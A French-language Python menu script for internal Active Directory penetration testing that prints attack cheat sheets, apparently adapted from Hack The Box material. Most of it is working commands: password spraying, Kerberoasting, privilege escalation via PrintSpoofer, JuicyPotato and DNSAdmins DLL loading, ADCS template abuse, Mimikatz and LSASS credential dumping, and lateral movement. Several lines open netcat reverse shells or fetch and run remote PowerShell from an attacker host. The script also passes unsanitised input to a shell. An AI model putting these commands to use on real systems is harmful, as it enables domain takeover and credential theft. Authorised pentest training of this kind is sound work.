#!/usr/local/bin/python

import subprocess


# @@@ Partie Pentest AD   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
def pentest_interne_ad():
    while True:
        print("\n\033[94m\033[1mMenu Pentest Interne > Active Directory:\033[0m")
        print("\033[94m1. Enumeration Passive\033[0m")
        print("\033[94m2. Enumeration Active\033[0m")
        print("\033[94m3. Recherche de Vulnérabilité No Auth\033[0m")
        print("\033[94m4. Recherche de Vulnérabilité Post Auth\033[0m")
        print("\033[94m5. Exploitation et Escalade de Privilèges\033[0m")
        print("\033[94m6. Post Exploitation et Lateral Movements\033[0m")
        print("\033[94m7. Liens Utiles et Tools\033[0m")
        print("\033[94m8. Retour au menu précédent\033[0m")

        choix_ad = input("Choisissez une option (1, 2, 3, 4, 5, 6, 7 ou 8): ")

        if choix_ad == "1":
            enum_passive_AD()
        elif choix_ad == "2":
            enum_active_AD()
        elif choix_ad == "3":
            vuln_no_auth_AD()
        elif choix_ad == "4":
            vuln_recherche_AD()
        elif choix_ad == "5":
            exploitation_AD()
        elif choix_ad == "6":
            post_exploitation_AD()
        elif choix_ad == "7":
            liens_utiles_AD()
        elif choix_ad == "8":
            print("Retour au menu précédent.")
            break
        else:
            print("Option invalide. Veuillez choisir une option valide.")


def enum_passive_AD(): #fonction appelé si choix énumération passive dans active directory
    print("""\033[91mVous avez choisi Enumeration Passive. Voici une liste de commandes et des liens utiles\033[0m :
      credits : hack the box    

    Reconnaissance Passive 
    - [ ] ASN / IP Registrars : [RIPE](\033[96mhttps://www.ripe.net/\033[0m) for searching in Europe, [BGP Toolkit](\033[96mhttps://bgp.he.net/\033[0m)
    - [ ] Domain Registrars & DNS : [Domaintools](\033[96mhttps://www.domaintools.com/\033[0m), [PTRArchive](\033[96mhttp://ptrarchive.com/\033[0m), [ICANN](\033[96mhttps://lookup.icann.org/lookup\033[0m), manual DNS record requests against the domain in question or against well known DNS servers, such as `8.8.8.8`. 
    - [ ] Social Media: Searching Linkedin, Twitter, Facebook, your region's major social media sites, news articles, and any relevant info you can find about the organization.
    - [ ] Public-Facing Company Websites : Often, the public website for a corporation will have relevant info embedded. News articles, embedded documents, and the "About Us" and "Contact Us" pages can also be gold mines.
    - [ ] Cloud & Dev Storage Spaces: [GitHub](\033[96mhttps://github.com/\033[0m), [AWS S3 buckets & Azure Blog storage containers](\033[96mhttps://grayhatwarfare.com/\033[0m), [Google searches using "Dorks"](\033[96mhttps://www.exploit-db.com/google-hacking-database\033[0mv)
    - [ ] Breach Data Sources: [HaveIBeenPwned](\033[96mhttps://haveibeenpwned.com/\033[0m) to determine if any corporate email accounts appear in public breach data, [Dehashed](\033[96mhttps://www.dehashed.com/\033[0m) to search for corporate emails with cleartext passwords or hashes we can try to crack offline. We can then try these passwords against any exposed login portals (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, custom applications, etc.) that may use AD authentication.
    - [ ] Google Dorks : ex: `filetype:pdf inurl:inlanefreight.com` pour les emails 
    - [ ] Username Harvesting : [linkedin2username](\033[96mhttps://github.com/initstring/linkedin2username\033[0m)
    - [ ] Credential Hunting : [Dehashed](\033[96mhttp://dehashed.com/\033[0m) 
    - [ ] identification des hosts : wireshark ou TCPdump
 """)

def enum_active_AD():
    print("Vous avez choisi Enumeration Active.")

    choice = input("Voulez-vous exécuter le script ou simplement afficher du texte ? (1 pour exécuter le script (dependance vuln_ad.sh requise), 2 pour afficher la cheatsheet) ")

    if choice == '1': # on la lancer une script.sh qui lance automatiquement les premières commandes no auth de la MM OCD (partie grise) et la recherche des quelques easy wins. 
        DCIP = input("Veuillez entrer l'IP du DC : ")
        DomName = input("Veuillez entrer le nom du domaine : ")
        NameSrv = input("Veuillez entrer le nom de la machine DC : ")

        print(f"Vous avez entré l'IP du DC : {DCIP}") # définir les variables pour le script.sh, si on déplace le script il faut penser à changer le chemin ligne 35 
        print(f"Vous avez entré le nom du domaine : {DomName}")
        print(f"Vous avez entré le nom de la machine serveur DC : {NameSrv}")

        script_bash = "./AD_project.sh" # changer ce chemin quand nécessaire
        command = f"{script_bash} {DCIP} {DomName} {NameSrv}"

        try:
            subprocess.run(command, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(f"Erreur lors de l'exécution du script Bash : {e}")
    elif choice == '2':
        print("""\033[91m\033[1mVoici quelques tools et liens utiles:\033[0m
              
              credit : hack the box & Tiyeuse \n""")
        print("""\n\033[95mReconnaissance Active\033[0m 
    - [ ] Utilisation de \033[1;38;5;208mResponder\033[0m  : ``sudo responder -I ens224 -A`` \033[95men écoute peut permettre d'obtenir des NTLMv2 hash de certains user par poisonning. 
    - [ ] il est possible de faire la même chose en important le module Inveigh.ps1 dans une machine windows : \033[38;5;75m[Inveigh](https://github.com/Kevin-Robertson/Inveigh)\033[0m****
    - [ ] utilisation de fping en check actif des machines : ``\033[1;38;5;208mfping -asgq <range ip/masque>\033[0m``
    - [ ] Utilisation de nmap : `\033[1;38;5;208msudo nmap -sCV -iL host.txt -oA <fichier de sortie.nmap>\033[0m` il est possible d'utiliser -A comme option en lieu et place de -sCV mais c'est très agressif. 
    - [ ] Identification des utilisateurs du domaine : Kerbrute : installation ``````\033[38;5;208msudo git clone https://github.com/ropnop/kerbrute.git\033[0m
    
    - [ ] Password Sprawing
        - [ ] étape 1 : obtenir la liste des utilisateurs du domaine, soit avec Kerbrute soit avec d'autres outils d'énumération comme enum4linux `\033[1;38;5;208menum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"` ou `\033[1;38;5;208mcrackmapexec smb 172.16.5.5 --users\033[0m`
        - [ ] étape 2 : récupérer la password policy du domaine si possible no auth (sinon le refaire une fois des creds obtenus) : ``\033[1;38;5;208mcrackmapexec smb 172.16.5.5 -u <utilisateur> -p <motdepasse> --pass-pol\033[0m``ou `\033[1;38;5;208mrpcclient -U "" -N 172.16.5.5 -> querydominfo\033[0m`ou `\033[1;38;5;208menum4linux -P <IP DU DC>\033[0m` (liste non exhaustive)
        - [ ] depuis une machine windows il est possible de faire la même chose avec le module \033[38;5;75m[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)\033[0m
    - [ ] Enumération des contrôles de sécurité actifs sur le domaine 
        - [ ] \033[38;5;75m[Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=win10-ps)\033[0m
        - [ ] regarder si AppLocker est actif \033[38;5;75m[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)\033[0m
        - [ ] [Constrained Language Mode]\033[38;5;75m(https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)\033[0m
        - [ ] check les  [Local Administrator Password Solution (LAPS)]\033[38;5;75m(https://www.microsoft.com/en-us/download/details.aspx?id=46899)\033[0m
        - [ ] \033[1;38;5;208m`Find-AdmPwdExtendedRights` checks the rights on each computer\033[0m
        - [ ] \033[1;38;5;208m`Get-LAPSComputers\033[0m
    - [ ] Enumération de Credentials  
        - [ ] \033[1;38;5;208mcrackmapexec\033[0m (de plus en plus flag par les AV)
        - [ ] null cession pour énumérer en rpcclient 
        - [ ] suite Impacket
    - [ ] Enumération du domaine
        - [ ] \033[38;5;75m[Bloodhound](https://github.com/BloodHoundAD/BloodHound)\033[0m
        - [ ] powerview : \033[38;5;75m[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)\033[0m
    - [ ] \033[38;5;75m[Snaffler](https://github.com/SnaffCon/Snaffler)\033[0m tool that can help us acquire credentials or other sensitive data in an Active Directory environment

- [ ] Enumération avec les outils natif de Windows "Living off the land"
    - [ ] Nom du PC : \033[33m`Hostname`\033[0m
    - [ ] Version de l'OS : \033[33m`[System.Environment]::OSVersion.Version`\033[0m
    - [ ] Patch et hotfixes : \033[33m`wmic qfe get Caption,Description,HotFixID,InstalledOn`\033[0m
    - [ ] network : \033[33m`ipconfig /all`\033[0m
    - [ ] afficher toutes les variables d'environnement pour la cession en cours : \033[33m`set`\033[0m
    - [ ] afficher le nom du domaine : \033[33m`echo %USERDOMAIN%`\033[0m
    - [ ] afficher le nom du contrôleur de domain : \033[33m`echo %logonserver%`\033[0m
    - [ ] afficher les modules Powershell : \033[33m`Get-Module`\033[0m
    - [ ] afficher la \033[96m[execution policy]\033[0m pour chaque host : \033[33m`Get-ExecutionPolicy -List`\033[0m
    - [ ] changer la \033[96m[execution policy]\033[0m dans le terminal actuel : \033[33m`Set-ExecutionPolicy Bypass -Scope Process`\033[0m 
    - [ ] obtenir l'historique Powershell : \033[96m<Historique Powershell>\033[0m
    - [ ] afficher les variables d'environnements : \033[33m`Get-ChildItem Env: | ft Key,Value`\033[0m
    - [ ] commande pour télécharger un fichier depuis Powershell et le charger en mémoire : \033[33m`Powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL du fichier à télécharger'); <follow-on commands>"`\033[0m
    - [ ] Utilisation d'une version legacy de powershell pour sortir des log machines : \033[33m`Powershell.exe -version 2`\033[0m
    - [ ] check des defenses : \033[33m`netsh advfirewall show allprofiles`\033[0m
    - [ ] Windows Defender Check : \033[33m`sc query windefend`\033[0m
    - [ ] Config machine : \033[33m`Get-MpComputerStatus`\033[0m
    - [ ] Suis-je seul sur l'hote : \033[33m`qwinsta`\033[0m
    - [ ] network information : \033[33m`arp -a; ipconfig /all; route print; netsh advfirewall show state`\033[0m
    - [ ] Utilisation de la \033[96m[Windows Management Instrumentation (WMI)]\033[0m, ce sont toutes les commandes qui commencent pas "wmic"
        - [ ] afficher les infos basic sur l'host : \033[33m`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`\033[0m
        - [ ] lister les process : \033[33m`wmic process list /format:list`\033[0m
        - [ ] afficher les infos sur le domaine et le DC : \033[33m`wmic ntdomain list /format:list`\033[0m
        - [ ] afficher les infos sur les comptes qui se sont déjà connectés à la machine : \033[33m`wmic useraccount list /format:list`\033[0m 
        - [ ] afficher les informations sur les groupes locaux : \033[33m`wmic group list /format:list`\033[0m
        - [ ] afficher les infos sur les comptes system qui sont utilisés comme des comptes de services : \033[33m`wmic sysaccount list /format:list`\033[0m 
    - [ ] Utilisation des commandes net 
        |\033[33m`net accounts`\033[0m|Information about password requirements|
        |\033[33m`net accounts /domain`\033[0m|Password and lockout policy|
        |\033[33m`net group /domain`\033[0m|Information about domain groups|
        |\033[33m`net group "Domain Admins" /domain`\033[0m|List users with domain admin privileges|
        |\033[33m`net group "domain computers" /domain`\033[0m|List of PCs connected to the domain|
        |\033[33m`net group "Domain Controllers" /domain`\033[0m|List PC accounts of domains controllers|
        |\033[33m`net group <domain_group_name> /domain`\033[0m|User that belongs to the group|
        |\033[33m`net groups /domain`\033[0m|List of domain groups|
        |\033[33m`net localgroup`\033[0m|All available groups|
        |\033[33m`net localgroup administrators /domain`\033[0m|List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default)|
        |\033[33m`net localgroup Administrators`\033[0m|Information about a group (admins)|
        |\033[33m`net localgroup administrators [username] /add`\033[0m|Add user to administrators|
        |\033[33m`net share`\033[0m|Check current shares|
        |\033[33m`net user <ACCOUNT_NAME> /domain`\033[0m|Get information about a user within the domain|
        |\033[33m`net user /domain`\033[0m|List all users of the domain|
        |\033[33m`net user %username%`\033[0m|Information about the current user|
        |\033[33m`net use x: \computer\share`\033[0m|Mount the share locally|
        |\033[33m`net view`\033[0m|Get a list of computers|
        |\033[33m`net view /all /domain[:domainname]`\033[0m|Shares on the domains|
        |\033[33m`net view \computer /ALL`\033[0m|List shares of a computer|
        |\033[33m`net view /domain`\033[0m|List of PCs of the domain|
    
    - [ ] Utilisation de \033[96m[Dsquery]\033[0m
        - [ ] dsquery user 
        - [ ] dsquery computer 
        - [ ] Wilcard Search : \033[96m```powershell-session dsquery * "CN=Users,DC=<NomDC-premierpartie>,DC=<NomDC, deuxiemepartie>"```\033[0m
""")
        # liste commande choix 2: no script
    else:
        print("Choix invalide. Veuillez entrer 1 pour exécuter le script ou 2 pour afficher du texte.")


def vuln_no_auth_AD(): #foncttion appelée si choix enumération no auth dans AD 
    print("Vous avez choisi Recherche de Vulnérabilité No Auth. \n credits : Hack the Box & Tiyeuse")
    print("# Ldap:")
    print("  -> Énumération des utilisateurs de l'AD.")
    print("  -> Énumération de la PSW et Lockout policies.")

    print("\nSMB:")
    print("  \n-> Relai NTLM, attaque rendue possible par l'absence de signature sur le protocole SMB. (attaque de type MITM)")
    print("  \n-> Partage SMB")

    print("\nBruteForce:")
    print("  \n-> Rejouer les MDP LinkedIn 2017 par exemple.")
    print("  \n-> Les noms d'utilisateur en MDP par exemple.")

    print("\n=> Si l'une des attaques No Auth fonctionne alors le Pentester est dans une situation de boite grise et ses privilèges dépendent du compte compromis.")


def vuln_recherche_AD():
    print("""Vous avez choisi Recherche de Vulnérabilité POST-AUTH voici la Mind Map qui doit servir de file d'Arianne tout du long du pentest : \033[96mhttps://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg\033[0m 


# Ci-après une liste de commande et de tools utilisables dans la recherche de vulnérabilité / exploitation Authentifié. 
       
------------------------Post Auth---------------------------------------------
Pour chercher des @@Domain Info@@

    -> avec @@Powerview@@
        
    @ Pour le Current Domain:

        -> Get-NetDomain

    @ Pour Enum Other Domains:

        -> Get-NetDomain -Domain <domain_name>
    
    @ Pour Get Domain SID:

        -> Get-DomainSID

    @ Pour Get Domain Policy:

        -> Get-DomainPolicy

    @ Pour Get Domain Controlers:

        -> Get-NetDomainController
        -> Get-NetDomainController -Domain <domain_name>

    @ Pour Enumerate Domain Users:

        -> Get-NetUser
        -> Get-NetUser -SamAccountName <user> 
        -> Get-NetUser | select cn

        # Pour Enumerate user logged on a machine
        -> Get-NetLoggedon
        -> Get-NetLoggedon -ComputerName <computer_name>

        # Pour Enumerate Session Information for a machine
        -> Get-NetSession
    
@ Enum Domain Computers:

    -> Get-NetComputer -FullData

    -> Get-DomainGroup

    # Enumerate Live machines    
    -> Get-NetComputer -Ping

          
@ Enumerate Shares:

    # Enumerate Domain Shares
    -> Find-DomainShare

    # Enumerate Domain Shares the current user has access
    -> Find-DomainShare -CheckShareAccess

@ Enum Group Policies:

Get-NetGPO

# Shows active Policy on specified machine
Get-NetGPO -ComputerName <computer_name>
Get-NetGPOGroup

# Get users that are part of a Machine's local Admin group
Find-GPOComputerAdmin -ComputerName <computer_name>
Enum ACLs:

# Search for interesting ACEs
Invoke-ACLScanner -ResolveGUIDs

#List All ACL (massive amound of information )
Find-InterestingDomainAcl

#Using Get-DomainObjectACL
step 1 : convert name to SID : Import-Module .\PowerView.ps1 into $1sid = Convert-NameToSid <username>
step 2 : Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Check the ACLs associated with a specified path (e.g smb share)
Get-PathAcl -Path "\\Path\Of\A\Share"
Enum Domain Trust:

Get-NetDomainTrust
Get-NetDomainTrust -Domain <domain_name>
Enum Forest Trust:

Get-NetForestDomain
Get-NetForestDomain Forest <forest_name>

# Domains of Forest Enumeration
Get-NetForestDomain
Get-NetForestDomain Forest <forest_name>

# Map the Trust of the Forest
Get-NetForestTrust
Get-NetDomainTrust -Forest <forest_name>
User Hunting:

# Find all machines on the current domain where the current user has local admin access
Find-LocalAdminAccess -Verbose

# Find local admins on all machines of the domain:
Invoke-EnumerateLocalAdmin -Verbose

# Find computers were a Domain Admin OR a spesified user has a session
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
Invoke-UserHunter -Stealth

# Confirming admin access:
Invoke-UserHunter -CheckAccess
Priv Esc to Domain Admin with User Hunting:
I have local admin access on a machine -> A Domain Admin has a session on that machine -> I steal his credentials/token and impersonate him

PowerView 3.0 Tricks

Bloodhound
With Powershell:

Invoke-BloodHound -CollectionMethod All,GPOLocalGroup,LoggedOn
Invoke-BloodHound -IgnoreLdapCert -LdapUser <user> -LdapPass <password> -CollectionMethod All,GPOLocalGroup,LoggedOn
With Exe:

.\sh.exe --CollectionMethod All,GPOLocalGroup
Ldeep
# Get users
ldeep -s 10.10.10.10 -d <DOMAIN_FQDN> -u <user> -p <password> users

# Dump all LDAP, generating also .lst files
ldeep -s 10.10.10.10 -d <DOMAIN_FQDN> -u <user> -p <password> all ldap_dump/
SPNs
With Impacket:

GetUserSPNs.py <domain_name>/<user>:<password>
GetUserSPNs.py <domain_name>/<user> -outputfile <filename> -hashes :<nt_hash>
With Powerview:

# List users with SPN
Get-NetUser -SPN

# Request TGS for every SPN
Invoke-Kerberoast
With Rubeus:

# Kerberoasting and outputing on a file with a specific format
Rubeus.exe kerberoast /domain:<domain_name> /outfile:<filename> 

# Kerberoast specific user account
Rubeus.exe kerberoast /user:<user> /domain:<domain_name> /outfile:<filename> /simple

# Kerberoast by specifying credentials 
Rubeus.exe kerberoast /creduser:<user> /credpassword:<password> /domain:<domain_name> /outfile:<filename>
""")

def exploitation_AD():
    print("""Vous avez choisi Exploitation. voici la Mind Map qui doit servir de file d'Arianne tout du long du pentest : \033[96mhttps://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg\033[0m""")
       

    print("""Privilege Escalation
PowerUp
Invoke-AllChecks
WinPeas
.\winpeas.exe cmd
FullPowers
Abuse some services executed as LOCAL SERVICE or NETWORK SERVICE in order to obtain SeAssignPrimaryToken and SeImpersonatePrivilege tokens.

.\fullpw.exe -c ".\nc.exe 10.10.10.150 443 -e powershell" -z""")

    print("""Powershell way:

[System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseQuotaPrivilege", "SeShutdownPrivilege", "SeUndockPrivilege", "SeIncreaseWorkingSetPrivilege", "SeTimeZonePrivilege"
$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\Windows\Temp\\nc64.exe 10.10.10.150 443 -e powershell`""
Register-ScheduledTask -Action $TaskAction -TaskName "SomeTask" -Principal $TaskPrincipal
Start-ScheduledTask -TaskName "SomeTask" \n""")

    print("""PrintSpoofer
Escalate to SYSTEM. The token SeImpersonatePrivilege is needed to escalate privileges. \n

.\pspoof.exe -c "C:\windows\temp\custom\nc.exe 10.10.10.150 443 -e powershell" \n""")

    print("""Potatoes
Like PrintSpoofer, the token SeImpersonatePrivilege is abused to escalate privileges. \n" """)

    print("""# Using a CLSID, C:\tmp\root.bat contains a reverse shell

        .\juicy.exe -t * -p C:\tmp\root.bat -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}" -l 9002

    Fileless reverse shell
        .\juicy.exe -l 12345 -p C:\Window\System32\cmd.exe -t * -a "/c powershell.exe -nop -w hidden -executionpolicy bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.150/nishang.ps1')"
CLSID can be obtain here. \n """)

    print (""" # DNS Admin Abuse

    -> If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work.

# Get members of the DNSAdmins group

    -> net localgroup "DNSAdmins" /domain

# Load a malicious dll from a member of DNSAdmins context

# Stop service
    -> sc.exe \\<DNS_SERVER> stop dns

# Replace the dll

    -> dnscmd.exe /config /serverlevelplugindll \\10.10.10.150/share/evil.dll

# Restart the service

    -> sc.exe \\<DNS_SERVER> start dns

# Backup Operator Abuse

    -> If we manage to compromise a user account that is member of the Backup Operators group, we can then abuse it's SeBackupPrivilege to create a shadow copy of the current state of the DC, extract the ntds.dit database file, dump the hashes and escalate our privileges to DA.

        -> Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:

# Create a .txt file that will contain the shadow copy process script
    
    Script ->{
        set metadata c:/<PathToSave>metadata.cab
        set context clientaccessible
        set context persistent
        begin backup
        add volume c: alias mydrive
        create
        expose %mydrive% w:
        }

    Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we can use this repo:


# Importing both dlls from the repo using powershell

    -> Import-Module ./SeBackupPrivilegeCmdLets.dll
    -> Import-Module ./SeBackupPrivilegeUtils.dll
  
# Checking if the SeBackupPrivilege is enabled

    -> Get-SeBackupPrivilege
  
# If it isn't we enable it

    -> Set-SeBackupPrivilege
  
# Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice

    -> Copy-FileSeBackupPrivilege w:\windows\\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite
  
# Dump the SYSTEM hive
reg save HKLM\SYSTEMc:\temp\system.hive 
Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.
Use secretsdump.py from impacket and dump the hashes.
Use psexec or another tool of your choice to PTH and get Domain Admin access.
Exchange Abuse
Abusing Exchange one Api call from DA
CVE-2020-0688
PrivExchange Exchange your privileges for Domain Admin privs by abusing Exchange
ADCS
Recon

Windows

- find vulnerable templates
    Certify.exe find /vulnerable

-find vulnerable templates for the current user
    Certify.exe find /vulnerable /currentuser

-find templates with SAN enabled
    ./certify.exe find /enrolleeSuppliesSubject


Linux

    certipy corp.local/user:password@10.10.10.10 find -vuln

ESC1-ESC2
Windows

-request a certificate with SAN
    ./Certify.exe request /ca:corp.local/ca_name /template:template_name /altname:administrator

-convert pem to pfx
    openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

-pass the certificate with rubeus
    ./Rubeus.exe asktgt /user:Administrator /password:pass /certificate:cert.pfx /ptt /nowrap

Linux
    certipy corp.local/user:password@10.10.10.10 req -ca ca_name -template template_name -alt administrator

ESC4
    Make it vulnerable to ESC1!

    Change the following attributes in the template.

mspki-enrollment-flag: Disable PEND_ALL_REQUESTS flag in order to request the template without Manager Approval.
In GUI, this attribute can be enabled by checking "CA manager approval" check box in "Issuance Requirements" tab.

mspki-ra-signature: Specify the number of Authorized Signatures to issue certificate.
In GUI, this attribute can be controlled by checking "This number of authorized signatures" check box in "Issuance Requirements" tab and setting the number.

mspki-certificate-name-flag: Enable ENROLLEE_SUPPLIES_SUBJECT flag in order to specify an arbitrary user account Subject Alternative Name (SAN) in certificate request.
In GUI, this attribute can be enabled by choosing "Supplly in the request" in "Subject Name" tab.

mspki-certificate-application-policy: Specify Certificate Application Policy Extension in order to validate the authentication.
In GUI, this attribute can be controlled by setting "Application Policies" in "Extensions" tab. It takes precedence over pkiextendedkeyusage and mspki-ra-application-policies.

pkiextendedkeyusage: Specify Extended Key Usage (EKU). Client Authentication 1.3.6.1.5.5.7.3.2 Smart Card Logon 1.3.6.1.4.1.311.20.2.2 PKINIT Client Authentication 1.3.6.1.5.2.3.4 Any Purpose 2.5.29.37.0 No EKU

mspki-ra-application-policies: This attribute encapsulates embedded properties for multipurpose use.
In GUI, this attribute can be controlled by checking "This number of authorized signatures" check box in "Issuance Requirements" tab and choosing "Application Policy" menu. Certify.exe displays this attribute as Application Policies.

Add enrollments rights.

Certificate-Enrollment: The corresponding GUID is 0e10c968-78fb-11d2-90d4-00c04f79dc55.

Certificate-AutoEnrollment: The corresponding GUID is a05b8cc2-17bc-4802-a710-e7c15ab866a2.

Or yolo it with 00000000-0000-0000-0000-000000000000 (all extended rights)

Windows

-add enroll rights with PowerView
    Add-DomainObjectAcl -TargetIdentity template_name -PrincipalIdentity controlled_user -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=corp,DC=local" -Verbose

-disable manager approval
    Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Identity template_name -XOR @{'mspki-enrollment-flag'=2} -Verbose

-disable signature requirements
    Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Identity template_name -Set @{'mspki-ra-signature'=0} -Verbose

- enable SAN attribute
    Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Identity template_name -XOR @{'mspki-certificate-name-flag'=1} -Verbose

-add authentication EKUs
    Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Identity template_name -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose

-request certificate for administrator
    ./Certify.exe request /ca:corp.local/ca_name /template:template_name /altname:administrator

-convert pem to pfx
    openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

-pass the certificate with rubeus
    ./Rubeus.exe asktgt /user:Administrator /password:pass /certificate:cert.pfx /ptt /nowrap


Linux

-Using modifyCertTemplate.py and certipy

-saved all previous attributes before modification
    python3 modifyCertTemplate.py corp.local/user:password -template template_name
    python3 modifyCertTemplate.py corp.local/user:password -template template_name get-acl 

-disable manager approval
    python3 modifyCertTemplate.py corp.local/user:password -template template_name -property mspki-enrollment-flag -value 2 

-disable signature requirements
    python3 modifyCertTemplate.py corp.local/user:password -template template_name -property mspki-ra-signature -value 0

-enable SAN attribute
    python3 modifyCertTemplate.py corp.local/user:password -template template_name -property msPKI-Certificate-Name-Flag -add enrollee_supplies_subject 

- add authentication EKUs
    python3 modifyCertTemplate.py corp.local/user:password -template template_name -property mspki-certificate-application-policy -value "'1.3.6.1.5.5.7.3.2', '1.3.6.1.4.1.311.20.2.2'"

-request certificate for administrator
    certipy corp.local/user:password@10.10.10.10 req -ca ca_name -template template_name -alt administrator
Credential Harvesting
LSASS
Mimikatz
# On the machine (AV might block it)
./mimikatz.exe "sekurlsa::logonPasswords full" exit

-Locally from a minidump
    ./mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" exit

- Lsassy
    lsassy -d <domain_name> -u <user> -p <password> -r -vv 10.10.10.10
    lsassy -d <domain_name> -u <user> -p <password> -dc-ip 10.10.10.10 -r --procdump /path/to/procdump -vv 10.10.10.0/24

Procdump
# Dump lsass memory (PID might bypass AVs)
    ./procdump64.exe -accepteula -ma lsass.exe lsass
    ./procdump64.exe -accepteula -ma <lsass_pid> lsass

# Parse the dump locally on windows (see above) or with pypykatz
pypykatz lsa minidump lsass.dmp
SAM
Impacket
secretsdump.py <domain_name>/<user>:<password>@10.10.10.10
secretsdump.py <domain_name>/<user>@10.10.10.10 -hashes :<nt_hash>

-Locally
    -Dump SYSTEM, SAM hives
        reg save HKLM/SYSTEM \\10.10.10.150/share/SYSTEM
        reg save HKLM/SYSTEM  \\10.10.10.150/share/SAM
        secretsdump.py -sam SAM -system SYSTEM local

DPAPI
Mimikatz
From mimikatz github""") 

    print("""Check the details of the credential

            -> mimikatz.exe 'dpapi::cred /in:C:\\Users\victim\\AppData\\Local\\Microsoft\\Credentials\12345678901234567890123456789012' exit""")

    print("""Get victim security context (inject into user process or impersonnate with token)

            -> Decrypt the Masterkey using her password: Tip: if we are on a user's context using /rpc will auth with DC and will decrypt the masterkey!""")
    print("""mimikatz.exe "dpapi::masterkey /in:c:\\Users\victim\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1313131313-8888888888-9999999999-1111\5f4b97cd-43aa-5e0f-26ab-fe63d801bbc4 /rpc" exit

Results: Masterkey:abcdef0123[...]4567890""")

    print(r"""SHA1 of masterkey:6b82b138e1a6b77f4c55a8df728288f56a3b6d5f""")

    print("decrypt the credential")
    print(""".\\mimikatz.exe ""token::elevate dpapi::cred /in:C:\\Users\victim\\AppData\\Local\\Microsoft\\Credentials\12345678901234567890123456789012 /masterkey:6b82b138e1a6b77f4c55a8df728288f56a3b6d5f exit""")

def post_exploitation_AD():
    print("""Vous avez choisi Post Exploitation. voici la Mind Map qui doit servir de file d'Arianne tout du long du pentest : \033[96mhttps://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg\033[0m

      Lateral Movement

    CrackMapExec

# There are many ways to do that, here is an example
    crackmapexec smb hosts.list -u <user> -p <password> --shares --continue-on-success
Powershell Remoting
# Enable Powershell Remoting on current Machine (need admin)
Enable-PSRemoting -force

# Create and enter into a new PSSession
$user = "DOMAIN\\User" ;$s= "password";$ss = Convertto-securestring -string $s -AsPlainText -Force;$Credential = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $ss;

New-PSSession -Credential $Credential | Enter-PSSession
Rce with PS credentials
$user = "DOMAIN\\User" ;$s= "password";$ss = Convertto-securestring -string $s -AsPlainText -Force;$Credential = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $ss;

Invoke-Command -ComputerName <target_computer> -Credential $Credential -ScriptBlock { whoami }
Delegation
Unconstrained Delegation
When we have admin rights on a machine with the TrustedForDelegation attribute we can abuse it in order elevate our privileges to domain admin. Note: it can be used to compromise another forest if the 2 forests have bidirectional relations and TGTDelegation set to True (this can be checked with PowerShell Active Directory module and the command Get-ADTrust -Filter *|fl). Goal: make a privileged user connect to our compromise machine.

# Monitoring incomings TGTs with rubeus:
.\rubeus.exe monitor /interval:2 /filteruser:DC01$

# Execute the printerbug to trigger the force authentication of the target DC to our machine (DC01 is compromised)
    
    -> .spoolsample.exe DC02.DOMAIN2.FQDN DC01.DOMAIN.FQDN

# Get the base64 captured TGT from Rubeus and inject it into memory:
